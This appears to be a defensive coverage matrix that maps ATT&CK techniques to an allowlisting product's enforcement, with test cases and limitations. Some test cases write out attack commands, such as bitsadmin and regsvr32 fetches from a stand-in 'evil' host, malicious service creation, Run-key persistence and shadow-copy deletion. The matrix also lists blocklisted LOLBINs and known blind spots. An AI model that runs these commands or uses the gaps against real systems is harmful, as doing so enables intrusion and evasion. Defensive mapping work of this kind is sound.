test_case: Unsigned supply chain payload -> blocked. Signed by compromised-but-trusted publisher -> allowed.
limitations: Publisher trust is the gap. Hash-based trust is more granular. This is a fundamental supply chain risk for any trust model.

technique_name: Compromise Software Dependencies and Development Tools
enforcement_mechanism: Same principle as parent. Compromised dependency signed by trusted publisher passes.
limitations: Signed by trusted publisher -> passes.

enforcement_mechanism: Same. Compromised software update with valid signature passes publisher trust.
Compromise hardware supply chain. Physical hardware. Below software layer.
limitations: Hardware security.

enforcement_mechanism: BITS downloads files to disk. Downloaded file must be trusted to execute. bitsadmin.exe can be blocklisted to prevent BITS job creation.
test_case: bitsadmin /transfer job /download http://evil/payload.exe C:\Temp\p.exe -> downloads OK, execution blocked. Blocklist bitsadmin for non-admins.
limitations: Download itself not prevented — only execution of downloaded payload.

enforcement_mechanism: Trusted relationship. Third-party access. Access mechanism, not file execution. Post-access Airlock enforces.
test_case: Third party RDPs in, runs unsigned tool -> blocked.
limitations: Access not prevented.

enforcement_mechanism: Hardware additions. Physical device. If device delivers malware, execution blocked. Device insertion not prevented.
test_case: Rogue USB device drops malware -> malware blocked.
limitations: Physical access/device insertion not Airlock scope.

enforcement_mechanism: net accounts via net.exe. Restrictable via blocklist metarule.
Indirect command execution via trusted LOLBINs (pcalua.exe, forfiles.exe, etc). Launched payload must be trusted. The indirect launchers can be blocklisted.
test_case: 1) forfiles /c C:\Temp\malware.exe -> malware blocked. 2) Blocklist pcalua.exe, forfiles.exe, SyncAppvPublishingServer.exe.
limitations: Indirect launcher is trusted but payload is still checked at execution.

enforcement_mechanism: Client-side exploits execute inside trusted processes. Airlock doesn't prevent the exploit itself. But post-exploitation: any payload dropped to disk (exe/DLL/script) must be trusted. Attacker's dropped tools blocked.
test_case: Trusted app exploited -> exploit drops C:\Temp\payload.exe -> payload blocked. Exploit drops DLL for sideload -> DLL blocked.
limitations: Pure in-memory exploitation (ROP chains, shellcode executing entirely in-process) not caught. That's EDR + exploit protection territory.

enforcement_mechanism: Core Airlock value. User double-clicks malicious file -> blocked by default-deny. Covers exe, script, installer, DLL.
test_case: Copy unsigned exe/msi/script to desktop, double-click -> blocked.
limitations: Social engineering itself not prevented.

enforcement_mechanism: Malicious link leads to file download. Downloaded payload must be trusted to execute. Airlock blocks the execution regardless of how the file was obtained.
test_case: Click link -> download unsigned exe -> attempt to run -> blocked.
limitations: Link clicking itself not prevented. Browser-only attacks (credential phishing pages) not in scope — that's web filtering/proxy.

enforcement_mechanism: Direct hit. Malicious file opened by user -> blocked. Covers email attachments, USB, downloads. MSI via script control. Macro-enabled docs: doc opens, dropped payload blocked.
test_case: 1) Unsigned exe from email -> blocked. 2) Malicious .msi -> blocked. 3) Macro doc drops exe -> exe blocked.
limitations: Doc opens in trusted Office. Macro code runs inside Office.

enforcement_mechanism: Pasted commands run inside trusted interpreter (not inspected). But any untrusted payload the pasted command tries to execute IS blocked. Blocklisting interpreters for non-admins prevents the paste target entirely.
test_case: 1) Paste download cradle into PS -> download succeeds, dropped exe blocked. 2) Blocklist PS for non-admins -> user can't open interpreter to paste into.
limitations: Inline commands in trusted interpreter not inspected. Blocking the interpreter is the strongest control.

enforcement_mechanism: DLL/library control blocks untrusted native libraries at load time. npm/pip packages with malicious native extensions blocked.
test_case: npm install with malicious native addon (.dll) -> blocked.
limitations: Pure interpreted library code needs script control.

enforcement_mechanism: Traffic signaling / port knocking. Network-level. No file execution.
limitations: Network security.

enforcement_mechanism: Port knocking. Network-level.
Socket filters. Kernel-level network manipulation.
Rogue domain controller. AD-level attack. Not file execution.
limitations: AD security.

enforcement_mechanism: Exploitation of remote services. Exploit on remote target. Post-exploitation tools must be trusted on target.
test_case: Exploit drops tool on target -> blocked.
limitations: In-memory exploitation not caught.

enforcement_mechanism: Exploit runs inside trusted process. If it drops tools/payloads to disk, those must be trusted.
test_case: Exploit dropping tool to disk -> tool blocked.
limitations: In-memory exploitation not caught. EDR + exploit protection territory.

enforcement_mechanism: Exploitation for credential access. Exploit runs inside trusted process. If drops tools, blocked.
limitations: In-memory exploitation not caught.

enforcement_mechanism: Data from information repositories. Reading data from wikis/SharePoint. Data/network operation.
SharePoint. Network/API access.
Databases. Network/API access.
System script proxy execution (parent). Signed scripts used to execute code. Scripts can be blocklisted.
test_case: Blocklist known proxy scripts. Payload loaded by proxy must be trusted.

enforcement_mechanism: PubPrn.vbs. Signed VBScript for proxy execution. Can be blocklisted or covered by script control.
test_case: Blocklist PubPrn.vbs or block via script control if modified (hash change).
limitations: Original signed PubPrn.vbs may be trusted by publisher.

enforcement_mechanism: SyncAppvPublishingServer. Can execute PowerShell. The PS code must pass script control.
test_case: Blocklist SyncAppvPublishingServer.exe. PS script it invokes checked by script control.

enforcement_mechanism: Browser information discovery. Reading browser data. Data operation.

System binary proxy execution (parent). LOLBINs used to execute code bypassing application controls. Airlock has predefined blocklist packages for these. DLL/script payloads must be trusted. This is a key defense area for Airlock.
test_case: Import LOLBAS/Microsoft Recommended Block Rules predefined blocklist. Payloads loaded by LOLBINs must be trusted regardless.
limitations: Comprehensive LOLBIN defense with blocklist + payload control.

enforcement_mechanism: Compiled HTML (.chm). hh.exe opens CHM files. Content inside CHM can launch processes. Launched process must be trusted. hh.exe can be blocklisted.
test_case: 1) CHM launching untrusted exe -> blocked. 2) Blocklist hh.exe.
limitations: CHM HTML content inside hh.exe context may execute some scripts.

enforcement_mechanism: Control panel items (.cpl). CPL files are DLLs. Must be trusted.
CMSTP. Can install/execute COM scriptlets. cmstp.exe can be blocklisted. Loaded DLLs must be trusted.
test_case: 1) Blocklist cmstp.exe. 2) CMSTP loading untrusted DLL -> blocked.

enforcement_mechanism: InstallUtil. .NET utility executing assemblies. Can be blocklisted. Loaded assemblies (DLLs) must be trusted.
test_case: 1) Blocklist installutil.exe. 2) InstallUtil loading untrusted assembly -> blocked.

enforcement_mechanism: Mshta. HTML application host. Can execute VBScript/JScript. Covered by script control. Can be blocklisted. Predefined in blocklist packages.
test_case: 1) Blocklist mshta.exe. 2) HTA file -> script control blocks untrusted content.
limitations: Key LOLBIN. Blocklist strongly recommended.

enforcement_mechanism: Msiexec. MSI execution. MSI files covered by script control. Msiexec can be restricted. DLLs loaded by MSI must be trusted.
test_case: 1) Untrusted MSI -> blocked by script control. 2) MSI loading untrusted DLL -> blocked.
limitations: Trusted-signed MSIs from trusted publishers install.

enforcement_mechanism: Odbcconf. Can execute DLLs. Can be blocklisted. DLL must be trusted.
test_case: 1) Blocklist odbcconf.exe. 2) Odbcconf loading untrusted DLL -> blocked.

enforcement_mechanism: Regsvcs/Regasm. .NET registration utilities. Execute assemblies. Can be blocklisted. Assemblies must be trusted.
test_case: 1) Blocklist regsvcs/regasm. 2) Loaded assembly must be trusted.

enforcement_mechanism: Regsvr32. COM object registration. Loads DLLs. Can be blocklisted. DLLs must be trusted. Network-based scriptlet execution also blocked if regsvr32 blocklisted.
test_case: 1) Blocklist regsvr32.exe. 2) Regsvr32 loading untrusted DLL -> blocked. 3) regsvr32 /s /n /u /i:http://evil scrobj.dll -> blocked if regsvr32 blocklisted.
limitations: Key LOLBIN.

enforcement_mechanism: Rundll32. Executes DLL exports. DLL must be trusted. Rundll32 can be blocklisted for non-admins.
test_case: 1) rundll32 untrusted.dll,EntryPoint -> DLL blocked. 2) Blocklist rundll32 for non-admins.
limitations: Rundll32 with trusted DLLs runs normally.

enforcement_mechanism: Verclsid. COM CLSID verification. Loads DLLs. DLL must be trusted.
limitations: Niche LOLBIN.

enforcement_mechanism: Mavinject. DLL injection utility. Can be blocklisted. DLL must be trusted.
test_case: 1) Blocklist mavinject.exe. 2) Mavinject loading untrusted DLL -> blocked.

enforcement_mechanism: MMC. Snap-in execution via .msc files. Snap-in DLLs must be trusted.
test_case: MMC loading untrusted snap-in DLL -> blocked.
limitations: MMC itself is trusted. Snap-in DLLs are the control point.

enforcement_mechanism: Untrusted Electron app exe blocked by default-deny. If Electron app is trusted, its bundled JS runtime executes in-process.
limitations: Trusted Electron apps run their bundled code in-process — not separately controlled.

enforcement_mechanism: Remote access tools (Cobalt Strike, AnyDesk, TeamViewer, etc) must be allowlisted. Unauthorized RATs blocked.
test_case: 1) Cobalt Strike beacon -> blocked. 2) AnyDesk not allowlisted -> blocked.
limitations: RATs signed by trusted publisher may pass publisher trust. Blocklist specific unwanted RATs.

enforcement_mechanism: IDE tunneling. IDE tools (VS Code Remote) must be allowlisted.
test_case: VS Code Remote tunnel binary not allowlisted -> blocked.
limitations: If IDE legitimately trusted, tunnel works.

enforcement_mechanism: Remote desktop software. RMM tools must be allowlisted.
limitations: Legitimately deployed RMM tools are trusted.

enforcement_mechanism: Remote access hardware. Physical devices. Not software.
XSL script processing. msxsl.exe can be blocklisted. wmic with /format:xsl — payload scripts checked by script control.
test_case: 1) Blocklist msxsl.exe. 2) XSL script payload checked via script control.
limitations: wmic.exe with /format:xsl harder to control without blocklisting wmic itself.

enforcement_mechanism: Template injection in Office docs. Remote template loads in trusted Office. Macro code runs inside Office. Dropped payloads blocked.
test_case: Remote template macro drops exe -> exe blocked.
limitations: Macro code runs inside trusted Office process.

enforcement_mechanism: Permission modification tools (icacls, takeown) restrictable via blocklist metarule.
test_case: Blocklist icacls.exe and takeown.exe for non-admins.
limitations: PowerShell alternatives still available if PS trusted.

technique_name: Windows File and Directory Permissions Modification
enforcement_mechanism: icacls.exe and takeown.exe: restrict via blocklist metarule for non-admins.
test_case: Blocklist icacls.exe and takeown.exe for non-admins.
limitations: PowerShell Set-Acl available if PS trusted.

enforcement_mechanism: Execution guardrails. If malware is untrusted, blocked before guardrails checked.
limitations: Malware can't execute to check guardrails.

enforcement_mechanism: Environmental keying. Same as parent.
Mutual exclusion. Same as parent.
nltest.exe and dsquery.exe: restrict via blocklist metarule for non-admins.
test_case: Blocklist nltest.exe and dsquery.exe for non-admins.
limitations: PowerShell Get-ADTrust available if PS trusted.

enforcement_mechanism: Domain/tenant policy modification. AD/cloud policy changes. No file execution.
limitations: AD security.

enforcement_mechanism: Group policy modification. AD operation.
limitations: If modified GPO delivers untrusted software, execution blocked on endpoints.

enforcement_mechanism: Trust modification. AD trust changes.
Custom wiper tools blocked by default-deny. Built-in destruction tools (format.com, cipher.exe) restrictable via blocklist metarule.
test_case: 1) Custom wiper -> blocked. 2) Blocklist format.com for non-admins. 3) Blocklist cipher.exe for non-admins.
limitations: del command runs inside trusted cmd.exe — hard to blocklist del specifically without blocking cmd. Blocklist cmd.exe for non-admins for maximum restriction.

enforcement_mechanism: Data encrypted for impact (ransomware). Ransomware executable must be trusted. This is Airlock's marquee use case.
test_case: Ransomware exe dropped via any method -> blocked. Ransomware DLL -> blocked. Ransomware script -> blocked.
limitations: Ransomware running inside already-trusted process (e.g., after injection) not caught.

enforcement_mechanism: sc.exe and net.exe for service stopping: restrictable via blocklist metarule. Airlock agent specifically protected by kernel driver against stop attempts.
test_case: 1) Attempt to stop Airlock agent -> kernel driver prevents. 2) Blocklist sc.exe for non-admins. 3) Blocklist net.exe for non-admins (blocks net stop).
limitations: Admin-exempted users can still stop services. Airlock agent protected regardless.

enforcement_mechanism: vssadmin.exe and bcdedit.exe: restrict via blocklist metarule for non-admins. Prevents shadow copy deletion and boot config modification — key ransomware precursors.
test_case: 1) Blocklist vssadmin.exe for non-admins -> prevents 'vssadmin delete shadows'. 2) Blocklist bcdedit.exe for non-admins -> prevents boot config tampering. 3) Blocklist wbadmin.exe for non-admins -> prevents backup deletion.
limitations: Admin-exempted users can still use these. PowerShell WMI shadow copy deletion possible if PS trusted.

enforcement_mechanism: Defacement. Modifying content. Data operation.
Internal defacement. Data modification.
External defacement. Server-side.
Firmware corruption. Below OS. Hardware/firmware level.
limitations: If firmware update tool is untrusted, blocked.

enforcement_mechanism: Resource hijacking (parent). Cryptominer must be trusted.
limitations: Miner in trusted process (JS in browser) not caught.

enforcement_mechanism: Cryptominer executables must be trusted. xmrig and similar tools blocked by default-deny.
limitations: Browser-based miners (JS in page) not caught — runs inside trusted browser process.

enforcement_mechanism: Bandwidth hijacking. Network-level.
VM/sandbox evasion checks. If malware is untrusted, blocked before it can check.
System checks. Same.
User activity checks. Same.
Time based checks. Same.
Network DoS. Network-level.
Direct network flood. Network.
Reflection amplification. Network.
Endpoint DoS. Resource exhaustion. Behavioral.
limitations: DoS tool must be trusted.

enforcement_mechanism: OS exhaustion flood. Network/resource.
Service exhaustion flood. Network.
Application exhaustion flood. Network.
Application/system exploitation. Exploit. In-memory.

Web shell scripts (.aspx/.asp/.php) blocked by script control if file type is configured. Compiled DLL components blocked by DLL control. Airlock deploys to servers — web shells and malicious IIS/Exchange components are directly controlled.
test_case: Upload untrusted .aspx web shell -> blocked by script control. Untrusted IIS module DLL -> blocked.
limitations: Script control must cover the relevant web script file types.

enforcement_mechanism: SQL stored procedures. Inside trusted SQL Server. No file execution.
limitations: xp_cmdshell spawning processes -> those processes checked.

enforcement_mechanism: Transport agent. Exchange transport agent DLL. Must be trusted.
test_case: Untrusted transport agent DLL -> blocked at load.
limitations: Exchange-specific.

enforcement_mechanism: Web shells. Script files deployed to web server. If type covered by script control, blocked. Compiled DLLs blocked.
test_case: Upload untrusted .aspx with script control -> blocked.
limitations: Requires script control for web script types.

enforcement_mechanism: IIS native modules (DLL). Must be trusted.
test_case: Install untrusted IIS module DLL -> blocked.
limitations: Module registration not prevented.

enforcement_mechanism: Terminal services DLL. Must be trusted to load.
Software discovery. Reading installed software. Data operation.
Security software discovery. Same.
Backup software discovery. Same.
shutdown.exe restrictable via blocklist metarule.
limitations: Forced reboot via other methods (API calls from trusted process) not caught.

enforcement_mechanism: Account access removal. Identity operation.
Internal spearphishing. Phishing from compromised internal account. Payload must be trusted.
test_case: Internal phishing email with malicious attachment -> blocked on victim.
limitations: Email delivery not prevented.

enforcement_mechanism: Steal web session cookie. Browser data access. No new file execution typically.
limitations: If cookie stealer tool is untrusted, blocked.

enforcement_mechanism: Pre-OS boot. Firmware/bootkit operates below OS. Airlock kernel driver loads after OS boot.
limitations: Secure Boot is the control here.

enforcement_mechanism: System firmware. Below OS.
limitations: UEFI security.

enforcement_mechanism: Component firmware. Below OS.
limitations: Hardware security.

enforcement_mechanism: Bootkit. Below OS level.
limitations: Secure Boot/ELAM territory.

enforcement_mechanism: Service creation succeeds (sc create not prevented). Service binary blocked at start if untrusted. sc.exe can be blocklisted for non-admins.
test_case: sc create evilsvc binPath= C:\Temp\evil.exe -> creation OK. sc start evilsvc -> binary blocked.
limitations: Service registration not prevented. Airlock controls the execution of the service binary, not the service configuration.

enforcement_mechanism: Windows Service. Binary/DLL must be trusted. Service DLLs via svchost blocked. sc.exe blocklist-controllable.
test_case: 1) sc create unsigned exe -> start blocked. 2) Malicious svchost service DLL -> blocked. 3) Blocklist sc.exe for non-admins.
limitations: Service creation not prevented.

enforcement_mechanism: Event triggered execution (parent). Code launched by event triggers must be trusted.
test_case: Varies by sub-technique. Trigger registers OK, payload blocked.

enforcement_mechanism: Change default file association. Handler exe must be trusted.
test_case: assoc .txt to evil handler exe -> exe blocked when .txt opened.
limitations: Reg mod not prevented.

enforcement_mechanism: Screensaver .scr (PE executable). Must be trusted.
test_case: Set screensaver to untrusted .scr -> blocked on activation.
limitations: .scr files are PE executables, full allowlist enforcement.

enforcement_mechanism: WMI event subscription. Payload launched by wmiprvse must be trusted. Script payloads via script control.
test_case: WMI event sub launching unsigned exe -> blocked when event fires.
limitations: Subscription creation not prevented.

enforcement_mechanism: Netsh helper DLL. Must be trusted to load.
test_case: netsh add helper unsigned.dll -> blocked at load.
limitations: netsh.exe trusted; DLL registration succeeds, load blocked.

enforcement_mechanism: Accessibility features (sethc.exe, utilman.exe). Replacement binary must be trusted by hash. Blocklist metarule on original_filename catches renamed trusted tools (e.g., cmd.exe renamed to sethc.exe).
test_case: Replace sethc.exe with untrusted binary -> blocked at lock screen activation. Blocklist original_filename 'cmd' -> catches cmd.exe renamed to sethc.exe.
limitations: If attacker copies a trusted binary with matching hash, it runs. Original filename metarule is the defense against renamed trusted tools.

enforcement_mechanism: AppCert DLLs. Loaded into every CreateProcess caller. Must be trusted.
test_case: Register untrusted AppCert DLL -> blocked at load.
limitations: Reg mod not prevented.

enforcement_mechanism: AppInit DLLs. Loaded into user-mode processes. Must be trusted.
limitations: Disabled by default with Secure Boot.

enforcement_mechanism: Application shimming. sdbinst.exe can be blocklisted. Shim-loaded DLLs must be trusted.
test_case: 1) Blocklist sdbinst.exe. 2) Shim loading untrusted DLL -> blocked.
limitations: If shim redirects to trusted binary, not inspected.

enforcement_mechanism: IFEO debugger. Debugger binary must be trusted.
test_case: IFEO debugger set to unsigned exe -> blocked when target launched.
limitations: Reg mod not prevented. Trusted debugger (cmd.exe) runs.

enforcement_mechanism: PowerShell profile. profile.ps1 must be trusted via script control.
test_case: Drop malicious profile.ps1 -> blocked at PS startup if untrusted.
limitations: If profile is path-trusted, runs. Audit path rules.

enforcement_mechanism: COM hijacking. Malicious DLL registered as COM object. Must be trusted.
test_case: Untrusted DLL as COM object -> blocked when instantiated.
limitations: Reg mod not prevented.

enforcement_mechanism: Installer packages (MSI). Blocked via script control (MSI is covered type).
limitations: Trusted-signed MSIs from trusted publishers install normally.

enforcement_mechanism: Python startup hooks. Python interpreter must be allowlisted. Startup hook .py must be trusted via script control.
test_case: 1) python.exe not allowlisted -> blocked. 2) Untrusted startup .py -> blocked.
limitations: If python trusted and hook in trusted path, runs.

enforcement_mechanism: Autostart registration (reg keys, startup folder) not prevented. Payload blocked at boot/logon when execution is attempted.
test_case: reg add HKCU\...\Run /v evil /d C:\Temp\mal.exe -> registration succeeds, mal.exe blocked at logon.
limitations: Registration mechanism not prevented. Airlock controls the execution of the payload, not the persistence setup.

enforcement_mechanism: Registry Run keys / Startup folder. Target exe must be trusted.
test_case: 1) Run key to unsigned exe -> blocked at logon. 2) Startup folder shortcut to unsigned exe -> blocked.
limitations: Reg/folder modification not prevented.

enforcement_mechanism: Authentication package DLL. Loaded by lsass. Must be trusted.
test_case: Register untrusted auth package DLL -> blocked at load.
limitations: Reg mod not prevented.

enforcement_mechanism: Time providers DLL. Loaded by w32time. Must be trusted.
test_case: Register untrusted time provider DLL -> blocked.
limitations: Reg mod not prevented.

enforcement_mechanism: Winlogon helper DLL. Loaded at logon. Must be trusted.
test_case: Untrusted Winlogon helper DLL -> blocked at logon.
limitations: Reg mod not prevented.

limitations: Drivers signed by trusted publishers load normally. Driver Block Rules predefined list covers known bad ones.

enforcement_mechanism: Shortcut modification. Target exe must be trusted.

enforcement_mechanism: Port monitors DLL. Loaded by spoolsv.exe. Must be trusted.

enforcement_mechanism: UAC bypass techniques often involve DLL hijacking in auto-elevate apps or registry modification pointing to untrusted payload. DLL control blocks hijacked DLLs. Untrusted payloads from registry-based bypasses blocked.
test_case: 1) UAC bypass via DLL hijack in auto-elevate app -> DLL blocked. 2) fodhelper.exe reg key to unsigned exe -> exe blocked.
limitations: Registry-based bypasses where payload is a trusted binary (cmd.exe) succeed — use blocklist to restrict.

enforcement_mechanism: UAC bypass. Various methods: DLL hijacking in auto-elevate apps (DLL must be trusted), mock trusted dirs, fodhelper.exe registry abuse. DLL hijack UAC bypasses caught by DLL control. Registry-based UAC bypasses using trusted auto-elevate binaries: the trusted binary runs, but any untrusted payload it loads is blocked.
test_case: 1) UAC bypass via DLL hijack in auto-elevate app -> DLL blocked. 2) fodhelper.exe reg key to unsigned exe -> exe blocked. 3) Blocklist common UAC bypass tools.
limitations: Registry-based bypasses where payload is trusted binary (e.g., cmd.exe) succeed. Use blocklist to restrict.

Subvert trust controls. Techniques targeting trust verification mechanisms. Airlock performs its own trust verification independent of Windows, but this is about undermining trust models broadly.
limitations: Publisher trust compromise (attacker gets valid code signing cert) is the fundamental risk. See T1553.002.

enforcement_mechanism: Code signing. Attacker signs malware with legitimate cert. If that cert's publisher is trusted in Airlock, malware passes. This is a fundamental trust model risk for publisher-based trust.
test_case: Malware signed by trusted publisher -> allowed. Unsigned -> blocked.
limitations: Publisher trust trade-off. Hash trust is more granular but harder to manage.

enforcement_mechanism: SIP/Trust Provider hijacking modifies Windows signature verification. Airlock's own publisher verification may use independent path, but this needs lab validation.
test_case: Needs lab testing to confirm Airlock's signature verification independence from SIP providers.
limitations: Uncertain. Treat as not covered until validated.

enforcement_mechanism: Install root certificate. Adding trusted CA. Airlock publisher trust verifies code signing certificates, not web/TLS certs. Custom code signing certs trusted by Airlock are explicitly added by admin.
test_case: N/A - Airlock admin must explicitly trust publishers.
limitations: Airlock doesn't auto-trust based on system cert store for execution decisions.

enforcement_mechanism: Mark-of-the-Web bypass. MOTW is a Windows security feature. Airlock doesn't rely on MOTW for trust decisions - it hashes files regardless.
test_case: File with or without MOTW -> Airlock hashes and checks regardless.
limitations: MOTW bypass is irrelevant to Airlock's enforcement model.

enforcement_mechanism: Code signing policy modification. Modifying Windows code signing enforcement. Airlock's enforcement is independent of Windows code signing policy.
test_case: Airlock enforces regardless of Windows code signing policy state.
limitations: Airlock operates its own trust model.

enforcement_mechanism: Replacing a trusted binary with malicious version. If hash changes (it will), new binary must be trusted. Publisher trust: if attacker signs with different cert, blocked.
test_case: Replace trusted app exe with unsigned version -> blocked on next launch (hash mismatch).
limitations: If trusted by path rule (not hash), replacement at same path may run. Prefer hash/publisher trust over path rules.

enforcement_mechanism: Credentials from password stores. Accessing browser/OS credential stores via trusted tools/APIs.
limitations: If standalone cred extraction tool is untrusted, blocked.

gpresult.exe restrictable via blocklist metarule for non-admins.

Reflective code loading relies on a loader process to invoke reflection (e.g., MSBuild, InstallUtil, RegAsm, PowerShell via Assembly.Load, custom .NET harnesses). Airlock blocks/blocklists the loader binaries. MSBuild, InstallUtil, RegAsm covered by predefined LOLBAS blocklist packages. PowerShell restrictable via metarule. Custom loader executables blocked by default-deny. The reflected assembly itself may never touch disk, but the process performing the reflection is controllable.
test_case: 1) Blocklist MSBuild/InstallUtil/RegAsm via predefined LOLBAS package - loader can't run. 2) Blocklist PowerShell for non-admins - prevents Assembly.Load via PS. 3) Custom .NET reflection harness exe - blocked by default-deny (untrusted). 4) execute-assembly style attack requires attacker tooling on disk - blocked.
limitations: If reflection occurs inside an already-trusted, non-blocklistable process via API calls, Airlock has no visibility into the in-memory assembly. That is EDR + memory protection territory.
